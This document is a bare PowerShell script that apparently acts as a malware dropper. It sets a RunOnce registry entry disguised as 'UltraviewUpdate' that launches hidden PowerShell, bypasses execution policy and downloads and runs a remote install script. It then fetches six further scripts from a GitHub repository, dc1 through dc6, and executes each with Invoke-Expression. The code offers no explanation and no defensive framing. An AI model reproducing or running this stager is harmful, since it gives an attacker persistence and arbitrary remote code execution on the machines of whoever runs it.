Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UltraviewUpdate" -Value 'powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb ''https://raw.githubusercontent.com/jia891/socv/refs/heads/main/install.ps1'' | iex"' -Type String -Force

for ($i = 1; $i -le 6; $i++) {
   
    $url = "https://raw.githubusercontent.com/jia891/pulsarvipppp/refs/heads/main/dc$i.ps1"
    
    
    $webClient = New-Object System.Net.WebClient
    $scriptContent = $webClient.DownloadString($url)
    
    
    Invoke-Expression $scriptContent
}
